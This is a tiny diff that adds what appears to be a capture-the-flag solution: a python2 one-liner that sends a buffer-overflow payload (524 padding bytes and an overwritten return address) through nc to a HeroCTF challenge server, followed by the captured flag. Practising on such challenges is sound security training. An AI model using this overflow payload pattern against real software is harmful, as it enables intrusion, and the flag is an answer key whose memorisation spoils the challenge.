@@ -1,0 +1,3 @@
+python2 -c 'print "A"*524 + "\xc2\x91\x04\x08"' | nc challs.heroctf.fr 7001
+
+Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
